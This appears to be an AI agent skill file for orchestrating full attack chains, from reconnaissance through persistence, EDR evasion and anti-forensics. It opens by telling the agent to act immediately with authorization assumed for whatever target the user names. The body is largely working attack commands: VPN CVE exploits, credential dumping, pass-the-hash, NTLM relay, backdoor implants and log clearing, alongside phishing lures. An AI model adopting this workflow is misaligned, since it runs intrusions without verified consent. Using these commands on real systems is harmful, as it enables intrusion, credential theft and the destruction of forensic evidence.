---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — routine operation reference; authorization assumed for the target the user named
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`) — case tracking + network profile
3. `NOW`: Plan phases in the **lead** role (`../ops/role-map.md`), write specialist_roles
4. `NEXT`: Read `../tool-index.md`, verify tool availability and real paths
5. `NEXT`: bootstrap missing tools, never guess paths
6. `ACT`: Work the phase gates per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. End: `docs-generator` report must include the Evidence chain

> Commander for multi-stage attack-path planning and execution. When the task needs a full "get from A to B" chain, this skill orchestrates the phases, coordinates sub-skills, and plans attack paths.
> Not "red-team-only" — any pentest scenario requiring cross-phase composition starts here.

---

## When to route to this skill

The following scenarios **MUST** go through this skill for full-chain planning before dispatching to sub-skills:

| Scenario | Why orchestration is needed |
|----------|-----------------------------|
| "Do a complete pentest for me" | plans the full flow from recon to report |
| "From the internet to domain admin" | spans boundary breach → privesc → lateral → AD phases |
| "HW defense exercise" | full attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | multi-dimensional recon + path planning |
| "I have a webshell, what next" | plans follow-up paths from the current foothold |
| "Plan an attack path for me" | path orchestration explicitly requested |
| "How far can this vuln go" | assess chained exploitation value |
| "Bug bounty continuous monitoring" | automated multi-stage flow |
| "Full intranet pentest" | lateral + privesc + domain attack combos |
| "Close-access / physical pentest plan" | physical access + intranet combo |
| "Supply chain attack path" | cross-org multi-hop attacks |
| "Phishing + post-exploitation" | initial access + follow-up combo |

**Single-stage tasks do NOT need this skill**:
- Port scan only → `pentest-tools/`
- SQL injection only → `pentest-tools/`
- APK reverse only → `apk-reverse/`
- Domain pentest only → `windows-ad/SKILL.md`

---

## Orchestration principles

### This skill's role

```
User proposes a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ plan the attack path, order the phases
    ↓ assess tools and methods per phase
    ↓
Dispatch to sub-skills for execution:
    ├── pentest-tools/     → tool usage, exploitation
    ├── apk-reverse/       → mobile pentest
    ├── js-reverse/        → web frontend breakthrough
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse
    └── browser-automation/ → automation
    ↓
Return here after each phase to evaluate the next step
    ↓
All done → docs-generator produces the report
```

### Path planning decision tree

```
Once you have a target:
1. What is the target? (Web/intranet/cloud/mobile/IoT)
2. What do you have now? (external view/existing credentials/existing foothold)
3. What is the final goal? (domain admin/data/specific system/impact proof)
4. Constraints? (time/stealth/untouchable systems)
    ↓
Plan the shortest path from the above
    ↓
One path blocked → return here and re-plan alternatives
```

---

## Full attack chain phases

---

## Phase 1 — Reconnaissance

### 1.1 Corporate digital asset mapping

```bash
# Subsidiary domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge & dedupe
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probe
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (full)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Use corporate registries (Qichacha/Tianyancha) for subsidiary lists to widen the attack surface
- Watch test environments (test., dev., staging.) and newly launched systems
- Certificate transparency logs (crt.sh) reveal hidden domains

### 1.2 Sensitive information leakage hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google dorks
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud AK/SK (Aliyun, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API docs
- VPN / bastion credentials

### 1.3 Employee profiling

**Password-dictionary generation rules**:
```
{name pinyin}{year}       → zhangsan2024
{name initials}{dept}     → zs_dev
{employee ID}@{domain}    → 10086@target.com
{name}{common suffixes}   → zhangsan@123, zhangsan!@#
```

**Sources**:
- Maimai/LinkedIn org structure
- Corporate WeChat / website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Tech stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Framework-specific probes
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## Phase 2 — Initial Access

### 2.1 Web vulnerability exploitation (high-frequency entry)

| Vuln type | Detection tool | Exploitation path |
|-----------|---------------|-------------------|
| SQL injection | sqlmap | data extraction → write shell → OS commands |
| SSTI | sstimap | template injection → RCE |
| File upload | manual + Burp | webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | manual | intranet probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → cookie | xsstrike | admin session hijack |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply chain attacks

**Attack path**:
1. Identify the third-party components/vendors the target uses
2. Attack the supplier for code-signing / update-push privileges
3. Deliver malicious payloads through legitimate update channels

**Common entries**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Outsourced personnel privilege use
- Shared IT vendor lateral movement

### 2.3 Phishing

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate expires soon, update now
- [IT Notice] Mailbox storage full, please clean up
- [HR] 2024 annual performance review results
- [Finance] Reimbursement system upgrade, log in to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (fake PDFs)
- HTML Smuggling
- ISO/IMG images (MOTW bypass)
- OneNote embedded scripts

**OAuth phishing** (2025 trend):
- Register a malicious OAuth app requesting permissions
- After user consent, obtain mailbox/file access
- No password needed, bypasses MFA

### 2.4 Close-access pentest (physical access)

| Technique | Tool | Effect |
|-----------|------|--------|
| BadUSB | Rubber Ducky / WiFi Ducky | keystroke injection → reverse shell |
| Malicious power bank | O.MG Cable | disguised cable implants a backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | fake AP → credential capture |
| RFID cloning | Proxmark3 | access card clone → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | persistent intranet access point |

```bash
# Fluxion WiFi phishing
fluxion  # interactive: pick target AP → create fake hotspot → capture WPA password

# BadUSB + Cobalt Strike
# USB injects a PowerShell downloader → C2 callback
```

### 2.5 VPN / remote access breakthrough

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud breakthrough

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## Phase 3 — Privilege Escalation

### 3.1 Windows privesc

| Technique | Condition | Tool |
|-----------|-----------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulns | unpatched | watson / wesng detection |
| Service path hijack | unquoted service path | PowerUp |
| DLL hijacking | writable DLL search path | Process Monitor |
| AlwaysInstallElevated | registry config | msiexec install malicious MSI |
| Scheduled tasks | writable task scripts | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privesc
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux privesc

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# common exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privesc
sudo vim -c ':!/bin/bash'

# sudo find privesc
sudo find / -exec /bin/bash \;

# Kernel vulns
uname -r  # check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database privesc

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privesc
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud privesc

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# look for iam:PassRole + lambda:CreateFunction → admin privileges

# Azure AD
# Global admin → all subscription control
# Application admin → add credentials to service principals
```

---

## Phase 4 — Lateral Movement

### 4.1 Credential acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealth lateral techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunnels (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forward
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP first
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to targets
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack paths

```bash
# BloodHound collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync rights → export all hashes

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## Phase 5 — Persistence

### 5.1 Windows persistence

| Technique | Stealth | Detection difficulty |
|-----------|:-------:|:--------------------:|
| Scheduled tasks | medium | low |
| Registry Run keys | low | low |
| WMI event subscriptions | high | high |
| DLL hijacking | high | medium |
| Shadow accounts | medium | medium |
| Golden Ticket | extreme | extreme |
| DSRM backdoor | extreme | extreme |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# clone RID via registry F value modification
```

### 5.2 Linux persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijack
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# patch pam_unix.so to add a master password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud persistence

```bash
# AWS Lambda backdoor
# create a scheduled Lambda that calls back to C2

# Azure AD app registration
# create app → add secret credential → grant Graph API permissions

# Container backdoor
# modify the base image → every new container ships with the backdoor
```

---

## Phase 6 — EDR/AV Evasion

### 6.1 Core bypass thinking

| Layer | Technique | Notes |
|-------|-----------|-------|
| Static detection | encrypt/obfuscate/custom loaders | avoid signature matches |
| Behavioral detection | indirect syscalls/unhooking | bypass API hooks |
| Memory detection | module stomping/heap encryption | avoid memory scans |
| Network detection | domain fronting/legit service tunnels | blend into normal traffic |
| Log detection | ETW patching/log clearing | reduce traces |

### 6.2 Practical bypass techniques

```
1. Custom shellcode loaders (no public tools)
2. Direct syscall invocation (bypass ntdll hooks)
3. Inject into low-monitoring processes (e.g. RuntimeBroker.exe)
4. C2 over HTTPS + domain fronting / Cloudflare Workers
5. In-memory execution, nothing on disk (fileless)
6. Legitimately signed programs as loaders (LOLBins)
```

### 6.3 C2 framework choice

| Framework | Highlights | Use when |
|-----------|------------|----------|
| Cobalt Strike | mature, stable, team collab | large red team ops |
| Sliver | open source, Go | budget limited |
| Havoc | modern, modular | customization needed |
| Mythic | multi-agent | cross-platform |
| AdaptixC2 | in Kali 2026.1 | fast deployment |

---

## Phase 7 — Anti-Forensics

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# ensure Mimikatz dumps are deleted
# ensure C2 beacons exited
# ensure temp files removed
```

---

## Red team iron rules

### Three bottom lines

1. **All operations stay inside the authorized target range**
2. **Exfiltrated data must be anonymized**
3. **Clean all traces (including memory-resident ones)**

### Operation discipline

- Assess risk level before every operation (low/medium/high/critical)
- Notify the PM before high-risk operations
- Keep an operation log (time, action, result)
- Report high-severity vulns immediately, don't expand exploitation
- Don't impact business availability (no DoS)
- Don't access/download real user data

### Typical failure cases

| Failure cause | Consequence | Lesson |
|---------------|-------------|--------|
| Mimikatz memory dump not cleaned | blue team traces the full attack path | clean up right after the operation |
| C2 domain flagged by threat intel | blocked on first connection | fresh domains + domain fronting |
| Phishing email triggers DLP alert | blue team warned in advance | test mail gateway rules |
| Lateral movement trips a honeypot | attack intent exposed | identify honeypots before moving |

---

## Tool cheat sheet

### Recon
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Close-access
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with other skills in this package

| Need | Route to |
|------|----------|
| Deep web vuln exploitation | `pentest-tools/SKILL.md` |
| Detailed intranet AD attacks | `windows-ad/SKILL.md` |
| Malware sample reverse | `reverse-engineering/SKILL.md` |
| APK reverse (mobile pentest) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated swarm pentest | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted pentest | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagrams | `diagram-generator/SKILL.md` |


## Completion self-check (MUST pass before claiming done)

- [ ] Did I execute every workflow step (not just read them)?
- [ ] Did I use real tool paths from `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the Checklist required by RULES?
